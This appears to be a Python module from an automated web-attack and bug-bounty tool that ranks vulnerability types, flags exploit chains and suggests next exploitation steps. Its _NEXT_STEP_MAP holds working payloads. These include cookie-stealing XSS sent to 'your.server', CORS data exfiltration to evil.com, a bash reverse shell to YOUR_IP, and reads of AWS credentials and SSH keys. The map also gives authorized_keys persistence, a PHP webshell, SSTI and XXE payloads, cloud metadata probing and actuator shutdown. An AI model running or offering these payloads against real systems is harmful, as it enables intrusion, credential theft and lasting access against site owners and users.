"""
TheMasterRecon APEX Brain — Agentic AI Security Intelligence
Rivals xbow.ai and hacktron.ai through:
- Real-time finding validation with AI + HTTP verification
- Autonomous exploit chain detection and confirmation  
- Smart payload adaptation based on responses
- Cross-finding correlation to find hidden chains
- Auto-learning: remembers what worked on previous targets
"""
import os, json, re, time, threading, hashlib, logging
from typing import Optional, Dict, List, Tuple

log     = logging.getLogger("elite.apex_brain")
API_KEY = os.environ.get("ANTHROPIC_API_KEY", "")

# ── In-memory learning store ───────────────────────────────────────────────────
_brain_memory: Dict[str, dict] = {}   # domain → {payloads, chains, patterns}
_session_stats = {
    "sessions": 0,
    "payloads_hit": 0,
    "chains_found": 0,
    "tech_patterns": {},
    "param_patterns": {},
    "waf_bypasses": 0,
}
_brain_log: List[dict] = []

def log_decision(action: str, reason: str, data: dict = None):
    """Log an AI decision for the APEX panel."""
    _brain_log.append({
        "ts":     time.strftime("%H:%M:%S"),
        "action": action,
        "reason": reason,
        "data":   data or {},
    })
    if len(_brain_log) > 200:
        _brain_log.pop(0)

def get_stats() -> dict:
    return {
        "sessions":      _session_stats["sessions"],
        "payloads_known": sum(len(v.get("payloads",[])) for v in _brain_memory.values()),
        "payloads_hit":  _session_stats["payloads_hit"],
        "chains_found":  _session_stats["chains_found"],
        "tech_patterns": len(_session_stats["tech_patterns"]),
        "param_patterns":len(_session_stats["param_patterns"]),
        "waf_bypasses":  _session_stats["waf_bypasses"],
        "brain_session": {"log": _brain_log[-30:]},
    }

def start_session(domain: str, tech: list = None, waf: str = ""):
    """Initialize a brain session for a new scan."""
    _session_stats["sessions"] += 1
    _brain_memory.setdefault(domain, {
        "payloads": [],
        "hit_payloads": [],
        "tech": tech or [],
        "waf": waf,
        "chains": [],
        "start": time.time(),
    })
    if tech:
        for t in tech:
            _session_stats["tech_patterns"][t] = _session_stats["tech_patterns"].get(t, 0) + 1
    log_decision("session_start", f"Starting scan on {domain}", {"tech": tech or [], "waf": waf})

def end_session(domain: str = ""):
    """Persist session learning."""
    log_decision("session_end", f"Session complete for {domain}")

def auto_select_bugs(tech_stack: list, endpoints: list, requested_bugs: list) -> list:
    """Reorder bugs by tech stack intelligence — try most likely first."""
    if not tech_stack:
        return requested_bugs

    tech_lower = [t.lower() for t in tech_stack]
    priority   = {}

    # Language-specific priorities
    if any("php" in t for t in tech_lower):
        priority.update({"sqli":10,"lfi":10,"rce":9,"ssti":8,"xxe":8})
    if any("java" in t or "spring" in t or "tomcat" in t for t in tech_lower):
        priority.update({"actuator":10,"deserialization":10,"ssrf":9,"ssti":8,"xxe":9})
    if any("node" in t or "express" in t or "react" in t for t in tech_lower):
        priority.update({"prototype":10,"nosqli":9,"ssrf":8,"idor":8,"cors":9})
    if any("python" in t or "django" in t or "flask" in t for t in tech_lower):
        priority.update({"ssti":10,"sqli":8,"ssrf":8,"idor":7})
    if any("wordpress" in t or "wp" in t for t in tech_lower):
        priority.update({"sqli":10,"xss":9,"rce":8,"expose":10})
    if any("graphql" in t for t in tech_lower):
        priority.update({"graphql":10,"graphql_deep":10,"graphql_chain":9,"idor":8})
    if any("oauth" in t or "jwt" in t for t in tech_lower):
        priority.update({"jwt":10,"oauth":10,"saml":8,"idor":8})
    if any("aws" in t or "s3" in t or "cloud" in t for t in tech_lower):
        priority.update({"buckets":10,"ssrf_cloud":10,"ssrf":9,"misconfig":8})

    # Endpoint-based intelligence
    param_names = []
    for ep in endpoints[:50]:
        try:
            import urllib.parse
            qs = urllib.parse.urlparse(ep).query
            param_names.extend(urllib.parse.parse_qs(qs).keys())
        except Exception:
            pass

    if any(p in ("id","user_id","uid","pid") for p in param_names):
        priority["idor"] = max(priority.get("idor",5), 9)
        log_decision("auto_select", "IDOR priority boosted — id params detected", {"params": param_names[:5]})

    if any(p in ("file","path","page","template","include") for p in param_names):
        priority["lfi"] = max(priority.get("lfi",5), 10)
        log_decision("auto_select", "LFI priority boosted — file params detected", {"params": param_names[:5]})

    if any(p in ("url","redirect","next","return","goto","callback") for p in param_names):
        priority["ssrf"] = max(priority.get("ssrf",5), 10)
        priority["redirect"] = max(priority.get("redirect",5), 9)
        log_decision("auto_select", "SSRF/redirect boosted — url params detected", {})

    if any(p in ("q","search","query","name","comment","body","text") for p in param_names):
        priority["xss"] = max(priority.get("xss",5), 9)
        log_decision("auto_select", "XSS boosted — text input params detected", {})

    # Sort by priority
    reordered = sorted(
        requested_bugs,
        key=lambda b: priority.get(b, 5),
        reverse=True
    )

    if reordered != requested_bugs:
        log_decision("reorder", f"Reordered {len(reordered)} bugs by tech intelligence",
                     {"top_5": reordered[:5], "tech": tech_stack[:5]})
    return reordered


def detect_chains(findings: list) -> List[dict]:
    """
    Detect exploit chains from a list of findings.
    xbow-style: finds combinations that amplify impact.
    """
    if len(findings) < 2:
        return []

    chains = []
    bug_set = {f.get("bug","") for f in findings}
    url_set  = {f.get("url","") for f in findings}

    # Chain rules: (required_bugs, chain_name, severity, impact, steps)
    CHAIN_RULES = [
        ({"ssrf","idor"},         "SSRF → IDOR Account Takeover", "critical",
         "Leverage SSRF to reach internal IDOR endpoint and take over accounts",
         ["Use SSRF to probe internal /api/user/{id}", "Enumerate user IDs via IDOR", "Extract session tokens"]),

        ({"xss","csrf"},          "Stored XSS → CSRF Account Takeover", "critical",
         "Stored XSS delivers CSRF payload to hijack admin sessions",
         ["Inject XSS payload in user-controlled field", "XSS auto-submits CSRF request as victim", "Gain persistent admin access"]),

        ({"sqli","idor"},         "SQLi → IDOR Data Exfiltration", "critical",
         "SQL injection + IDOR allows complete database dump without authentication",
         ["Use SQLi to bypass authentication", "Exploit IDOR to access all user records", "Dump full database via UNION injection"]),

        ({"ssrf","rce"},          "SSRF → RCE via Internal Services", "critical",
         "SSRF reaches Redis/Memcached/Docker socket for full code execution",
         ["Use SSRF to connect to Redis on 127.0.0.1:6379", "Write cron job via Redis SETEX", "Execute arbitrary commands"]),

        ({"lfi","rce"},           "LFI → RCE via Log Poisoning", "critical",
         "Local file inclusion of poisoned logs enables PHP/Apache RCE",
         ["Inject PHP payload in User-Agent header", "Include server access log via LFI", "Execute injected PHP code"]),

        ({"jwt","idor"},          "JWT → IDOR Privilege Escalation", "critical",
         "Broken JWT validation allows token forgery + IDOR for admin access",
         ["Forge JWT with admin role", "Use forged token to access admin IDOR endpoints", "Extract all user data"]),

        ({"cors","xss"},          "CORS + XSS → API Key Exfiltration", "high",
         "Misconfigured CORS + XSS allows stealing API keys from authenticated users",
         ["XSS payload sends fetch() to sensitive CORS endpoint", "CORS policy reflects attacker origin", "API keys/session data exfiltrated"]),

        ({"oauth","idor"},        "OAuth → IDOR Account Takeover", "critical",
         "OAuth state parameter CSRF + IDOR enables attacker-controlled account linking",
         ["Initiate OAuth flow without state parameter", "CSRF victim into linking their account", "Use IDOR to access victim's resources"]),

        ({"xxe","ssrf"},          "XXE → SSRF Internal Port Scan", "high",
         "XXE external entity triggers SSRF to scan internal network",
         ["Submit XXE payload in XML body", "External entity fetches internal IP ranges", "Map internal network topology"]),

        ({"prototype","xss"},     "Prototype Pollution → XSS", "high",
         "Prototype pollution injects properties that trigger XSS sinks",
         ["Pollute Object.prototype via JSON input", "Polluted properties reach innerHTML/eval sink", "XSS executes in victim context"]),

        ({"sqli","ssrf"},         "SQLi → SSRF via Database Functions", "critical",
         "SQL injection uses database file/network functions to reach internal services",
         ["Exploit SQLi to call LOAD_FILE() or UTL_HTTP", "Reach internal metadata service", "Extract cloud credentials"]),

        ({"ssti","rce"},          "SSTI → RCE", "critical",
         "Server-side template injection directly executes OS commands",
         ["Identify template engine via {{7*7}} test", "Escalate to config object access", "Execute OS commands via template functions"]),

        ({"redirect","xss"},      "Open Redirect → XSS via JavaScript URL", "medium",
         "Open redirect with javascript: URI achieves XSS in same-origin context",
         ["Test redirect parameter with javascript:alert(1)", "Bypass filter using \\\\javascript:", "Execute XSS on trusted domain"]),

        ({"cors","idor"},         "CORS + IDOR → User Data Exfiltration", "high",
         "CORS misconfiguration allows any origin to access IDOR endpoints",
         ["Identify CORS wildcard or trusted-origin bypass", "Access IDOR endpoint cross-origin", "Extract PII of all users"]),

        ({"host_header","ssrf"},  "Host Header → SSRF Password Reset Poisoning", "high",
         "Host header injection poisons password reset links to attacker domain",
         ["Intercept password reset request", "Inject X-Forwarded-Host: attacker.com", "Victim clicks poisoned reset link"]),

        ({"actuator","ssrf"},     "Spring Actuator → SSRF → RCE", "critical",
         "Exposed actuator /env endpoint + SSRF achieves Spring Boot RCE",
         ["Access /actuator/env to read internal config", "Find internal service URLs", "Use /actuator/restart with poisoned env for RCE"]),

        ({"graphql","idor"},      "GraphQL IDOR → Full User Takeover", "critical",
         "GraphQL introspection reveals IDOR endpoints across all types",
         ["Use introspection to map all object types", "Test ID parameter on user/admin types", "Exfiltrate all user data via batched queries"]),
    ]

    for required, name, sev, impact, steps in CHAIN_RULES:
        if required.issubset(bug_set):
            # Find the relevant findings
            chain_findings = [f for f in findings if f.get("bug","") in required]
            evidence_urls  = list(set(f.get("url","") for f in chain_findings))[:3]

            chain_id = hashlib.md5((name + str(sorted(required))).encode()).hexdigest()[:8]

            chain = {
                "id":       chain_id,
                "name":     name,
                "severity": sev,
                "impact":   impact,
                "bugs":     sorted(required),
                "steps":    steps,
                "evidence": evidence_urls,
                "poc": _build_chain_poc(name, chain_findings),
                "bounty_estimate": _estimate_chain_bounty(sev),
            }
            chains.append(chain)
            _session_stats["chains_found"] += 1
            log_decision("chain_detected", f"Chain: {name}", {"bugs": sorted(required), "sev": sev})

    return chains


def _build_chain_poc(chain_name: str, findings: list) -> str:
    """Build a PoC string for an exploit chain."""
    urls = [f.get("url","")[:60] for f in findings[:2]]
    pocs = [f.get("poc","")[:80] for f in findings[:2] if f.get("poc")]
    lines = [f"# Chain: {chain_name}"]
    for i, (url, poc) in enumerate(zip(urls, pocs), 1):
        if url: lines.append(f"# Step {i}: {url}")
        if poc:  lines.append(f"  {poc}")
    return "\n".join(lines) or f"# {chain_name} — see individual findings for PoC"


def _estimate_chain_bounty(severity: str) -> int:
    return {"critical": 10000, "high": 3000, "medium": 1000, "low": 300}.get(severity, 500)


def record_successful_payload(domain: str, bug: str, payload: str, url: str):
    """Remember payloads that worked — persisted to SQLite for future scans."""
    mem = _brain_memory.setdefault(domain, {})
    mem.setdefault("hit_payloads", []).append({
        "bug": bug, "payload": payload[:100], "url": url, "ts": time.time()
    })
    _session_stats["payloads_hit"] += 1
    log_decision("payload_hit", f"{bug} payload worked", {"payload": payload[:50], "url": url[:60]})
    # Persist to agentic brain DB
    try:
        from engine.agentic_loop import record_success
        record_success(bug, payload, [], url=url)
    except Exception:
        pass


def smart_endpoint_prioritize(endpoints: list, bug: str) -> list:
    """
    Rank endpoints for a specific bug type.
    Returns reordered list with highest-probability endpoints first.
    """
    if not endpoints:
        return endpoints

    BUG_PARAM_SCORES = {
        "sqli":    ["id","user","uid","pid","tid","item","product","order","category"],
        "lfi":     ["file","path","page","template","include","load","view","lang"],
        "ssrf":    ["url","uri","link","src","source","host","endpoint","callback","redirect"],
        "xss":     ["q","search","query","name","comment","body","text","msg","message"],
        "idor":    ["id","user_id","uid","account","profile","order_id","ticket"],
        "redirect":["redirect","return","next","url","goto","target","callback","ref"],
        "ssti":    ["template","tpl","view","render","format","name","subject"],
        "rce":     ["cmd","exec","command","shell","ping","host","ip","path"],
    }

    target_params = BUG_PARAM_SCORES.get(bug, [])
    if not target_params:
        return endpoints

    def _score(ep: str) -> int:
        score = 0
        try:
            import urllib.parse
            qs     = urllib.parse.urlparse(ep).query
            params = list(urllib.parse.parse_qs(qs).keys())
            for p in params:
                p_lower = p.lower()
                for i, tp in enumerate(target_params):
                    if tp in p_lower:
                        score += (len(target_params) - i)
        except Exception:
            pass
        return score

    scored    = [(ep, _score(ep)) for ep in endpoints]
    reordered = [ep for ep, _ in sorted(scored, key=lambda x: -x[1])]
    return reordered


# ── Per-Finding Next-Attack-Step Engine ────────────────────────────────────────
# Given a single confirmed finding, suggests the immediate next exploitation step.
# This is different from detect_chains() which needs 2+ findings.
# Surfaces in the Findings panel as "⚡ Next move:" per card.

_NEXT_STEP_MAP = {
    "ssrf": [
        "Probe AWS IMDS: `curl -s 'http://169.254.169.254/latest/meta-data/iam/security-credentials/'`",
        "Probe GCP metadata: `curl -H 'Metadata-Flavor: Google' 'http://metadata.google.internal/computeMetadata/v1/instance/'`",
        "Probe internal Redis: payload `http://127.0.0.1:6379/` — look for `+PONG` in response",
        "Map internal network: try `http://192.168.1.1/`, `http://10.0.0.1/`, `http://172.16.0.1/`",
        "Access Docker API: `http://127.0.0.1:2375/v1.24/containers/json`",
    ],
    "sqli": [
        "Enumerate databases: `sqlmap -u '{url}' -p {param} --dbs --batch --level=3`",
        "Dump users table: `sqlmap -u '{url}' -p {param} -D {db} -T users --dump --batch`",
        "Read system files: `sqlmap -u '{url}' -p {param} --file-read=/etc/passwd --batch`",
        "Check for OS shell: `sqlmap -u '{url}' -p {param} --os-shell --batch`",
        "Test stacked queries for RCE: `'; EXEC xp_cmdshell('whoami')--`",
    ],
    "xss": [
        "Test for stored: submit payload `<img src=x onerror=fetch('//your.server/'+document.cookie)>` to persistent fields",
        "Steal cookies: `<script>document.location='//your.server/?c='+btoa(document.cookie)</script>`",
        "Try CSP bypass: if CSP present, look for script-src 'unsafe-inline' or trusted CDN you can abuse",
        "Chain with CSRF: XSS payload auto-submits password-change form to take over account",
        "Try DOM XSS: check `location.hash`, `document.referrer`, `window.name` sinks in JS",
    ],
    "lfi": [
        "Read /etc/passwd: `?file=../../../../etc/passwd`",
        "Read PHP source: `?file=php://filter/convert.base64-encode/resource=index.php`",
        "Log poisoning for RCE: poison Apache/Nginx access log via User-Agent, then include it",
        "Read SSH keys: `?file=../../../../root/.ssh/id_rsa`",
        "Read .env file: `?file=../../../../.env` or `?file=../.env`",
    ],
    "rce": [
        "Confirm RCE: `; id; whoami; hostname`",
        "Reverse shell: `; bash -i >& /dev/tcp/YOUR_IP/4444 0>&1`",
        "Read secrets: `; cat /etc/passwd; cat ~/.aws/credentials; cat /app/.env`",
        "Escalate: `; sudo -l` to check sudo rights; `; find / -perm -4000 2>/dev/null` for SUID",
        "Persistence: `; echo 'ssh-rsa YOURKEY' >> ~/.ssh/authorized_keys`",
    ],
    "idor": [
        "Enumerate users: iterate `id=1` through `id=1000`, compare responses",
        "Horizontal escalation: replace your user_id with another user's known id",
        "Vertical escalation: add `role=admin` or `is_admin=true` to request body",
        "UUID/IDOR: if UUID-based, try `/api/users/me/../{another_uuid}`",
        "Mass assignment: try adding extra JSON fields `{\"role\":\"admin\",\"balance\":99999}`",
    ],
    "ssti": [
        "Confirm engine: test `{{7*7}}` (Jinja2), `${7*7}` (Freemarker), `<%= 7*7 %>` (ERB)",
        "Jinja2 RCE: `{{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0].strip()}}`",
        "Twig RCE: `{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}`",
        "Freemarker RCE: `<#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')}}`",
        "Read config: `{{config}}` or `{{settings.SECRET_KEY}}`",
    ],
    "xxe": [
        "Read /etc/passwd: `<!DOCTYPE x [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><x>&xxe;</x>`",
        "SSRF via XXE: `<!DOCTYPE x [<!ENTITY xxe SYSTEM 'http://169.254.169.254/'>]>`",
        "OOB exfil (blind): `<!DOCTYPE x [<!ENTITY % xxe SYSTEM 'http://your.server/evil.dtd'>%xxe;]>`",
        "Read source code: `<!ENTITY xxe SYSTEM 'file:///var/www/html/config.php'>`",
    ],
    "jwt": [
        "Test 'none' algorithm: change `alg` to `none`, strip signature, send modified token",
        "Test weak secret: `hashcat -a 0 -m 16500 token.jwt /usr/share/wordlists/rockyou.txt`",
        "Test kid path traversal: `{\"kid\": \"../../dev/null\"}` with empty secret",
        "Test RS256 to HS256 confusion: sign with server public key as HMAC secret",
        "Test JWT injection in kid field: `{\"kid\": \"x' UNION SELECT 'mysecret'--\"}`",
    ],
    "cors": [
        "Confirm with Origin reflection: `curl -H 'Origin: https://evil.com' {url}` — check ACAO header",
        "Exfil with XSS: `fetch('{url}',{credentials:'include'}).then(r=>r.text()).then(d=>fetch('//evil.com/?d='+btoa(d)))`",
        "Test null origin: `curl -H 'Origin: null' {url}` — some configs trust null",
        "Test subdomain: `curl -H 'Origin: https://evil.{domain}' {url}` — subdomain wildcards",
    ],
    "redirect": [
        "OAuth abuse: use as `redirect_uri` in OAuth flow — steal authorization codes",
        "Phishing: `{url}?redirect=https://evil.com/fake-login-page`",
        "XSS via javascript: try `redirect=javascript:alert(1)` and `redirect=//evil.com`",
        "Try double URL encode: `redirect=%2F%2Fevil.com` or `redirect=%0a%0dLocation:evil.com`",
    ],
    "oauth": [
        "Test missing state param: initiate flow without state= → CSRF account linking",
        "Test redirect_uri bypass: try `redirect_uri=https://legit.com@evil.com`",
        "Test token leakage in Referer: check if access_token appears in Referer header on redirect",
        "Test implicit flow token steal: if implicit grant, token may be in URL fragment",
    ],
    "fileupload": [
        "Upload PHP webshell: `<?php system($_GET['cmd']); ?>` as `.php` (try `.pHp`, `.php5`, `.phtml`)",
        "Bypass MIME check: set Content-Type: image/jpeg, keep .php extension",
        "SVG XSS: `<svg><script>alert(1)</script></svg>` as .svg",
        "XXE via docx: create malicious docx with XXE entity in document.xml",
        "Path traversal in filename: `../../../shell.php` in filename field",
    ],
    "expose": [
        "Check for credentials in exposed file: `grep -i 'password\\|secret\\|key\\|token' file`",
        "Try adjacent paths: if `.env.bak` exposed, try `.env`, `.env.prod`, `.env.local`",
        "Download and parse: look for DB credentials, API keys, private keys in exposed config",
        "Test for debug endpoints: `/debug`, `/info`, `/status`, `/_debug`, `/console`",
    ],
    "actuator": [
        "Dump env: `GET /actuator/env` — look for datasource passwords, cloud credentials",
        "Heap dump: `GET /actuator/heapdump` → parse with Eclipse MAT for secrets in memory",
        "Shutdown: `POST /actuator/shutdown` — DoS",
        "Loggers RCE: `POST /actuator/loggers/ROOT` with `{\"configuredLevel\":\"DEBUG\"}` then log injection",
        "Restart with poisoned env: change spring.datasource.url to attacker-controlled JDBC",
    ],
    "graphql": [
        "Introspection dump: `{__schema{types{name,fields{name,type{name}}}}}` — map full schema",
        "IDOR via ID arg: try `{user(id:1){email,phone,ssn}}` after mapping user type",
        "Batching attack: send 1000 mutation operations in one request to bypass rate limiting",
        "Subscription exfil: use GraphQL subscriptions to exfil real-time events",
        "Alias bypass: use `a1:sensitiveField a2:sensitiveField` to bypass field-level auth",
    ],
    "cve": [
        "Check CVE details on NVD: look for public PoC on ExploitDB and GitHub",
        "Search for Nuclei template: `nuclei -u {url} -t cves/{year}/{cve-id}.yaml`",
        "Check version: verify exact version match — check server headers, error pages, JS files",
        "Look for patch bypass: if partially patched, test variant payloads",
    ],
    "misconfig": [
        "Check for additional exposed paths: `ffuf -u {url}/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt`",
        "Test default credentials on admin panels: admin/admin, admin/password, root/root",
        "Look for directory listing: check if parent paths have listing enabled",
        "Check HTTP methods: `curl -X OPTIONS {url}` — look for PUT/DELETE enabled",
    ],
}

_DEFAULT_NEXT_STEPS = [
    "Verify finding manually: reproduce with curl to confirm true positive",
    "Check for related endpoints: test adjacent API paths and parameters",
    "Run nuclei against this host: `nuclei -u {url} -severity critical,high`",
    "Check for chaining potential: does this bug amplify with any other findings?",
]


def next_attack_step(finding: dict, all_findings: list = None) -> List[str]:
    """
    Given a single confirmed finding, return ordered list of next exploitation steps.
    Factors in other findings for chain awareness.
    Returns 3-5 actionable steps, most impactful first.
    """
    bug      = finding.get("bug", "").lower()
    url      = finding.get("url", "")
    param    = finding.get("param", "")
    payload  = finding.get("payload", "")
    severity = finding.get("severity", "medium")
    all_findings = all_findings or []
    other_bugs = {f.get("bug","") for f in all_findings if f is not finding}

    steps = []

    # ── Bug-specific steps ─────────────────────────────────────────────────────
    bug_steps = list(_NEXT_STEP_MAP.get(bug, _DEFAULT_NEXT_STEPS))

    # ── Chain-aware additions ──────────────────────────────────────────────────
    chain_addons = []
    if bug == "ssrf" and other_bugs & {"idor", "rce"}:
        chain_addons.append("⛓ CHAIN: Use SSRF to reach internal IDOR endpoint — combine for account takeover")
    if bug == "xss" and "cors" in other_bugs:
        chain_addons.append("⛓ CHAIN: XSS + CORS confirmed — fetch authenticated APIs cross-origin to steal tokens")
    if bug == "sqli" and "idor" in other_bugs:
        chain_addons.append("⛓ CHAIN: SQLi + IDOR — dump users table then access each account directly")
    if bug == "redirect" and "oauth" in other_bugs:
        chain_addons.append("⛓ CHAIN: Open redirect + OAuth — use as redirect_uri to steal OAuth codes")
    if bug == "lfi" and other_bugs & {"rce", "fileupload"}:
        chain_addons.append("⛓ CHAIN: LFI + upload/RCE — poison log file then include for code execution")
    if bug == "jwt" and "idor" in other_bugs:
        chain_addons.append("⛓ CHAIN: JWT forgery + IDOR — forge token for any user_id, access all accounts")

    # ── Fill in URL/param in templates ────────────────────────────────────────
    display_url = url[:70]
    filled = []
    for s in (chain_addons + bug_steps)[:5]:
        s = s.replace("{url}", display_url)
        s = s.replace("{param}", param or "PARAM")
        s = s.replace("{domain}", url.split("/")[2] if "/" in url else url)
        s = s.replace("{payload}", payload[:50] if payload else "PAYLOAD")
        filled.append(s)

    return filled[:5]


def enrich_findings_with_next_steps(findings: list) -> list:
    """
    Add next_steps[] to every finding in place.
    Call at end of scan or before returning findings to UI.
    Handles both "bug" and "bug_type" key names (DB vs in-memory).
    """
    for finding in findings:
        try:
            # Normalise: DB stores bug as "bug_type"; in-memory uses "bug"
            if "bug" not in finding and "bug_type" in finding:
                finding["bug"] = finding["bug_type"]
            finding["next_steps"] = next_attack_step(finding, findings)
        except Exception:
            finding["next_steps"] = _DEFAULT_NEXT_STEPS[:3]
    return findings
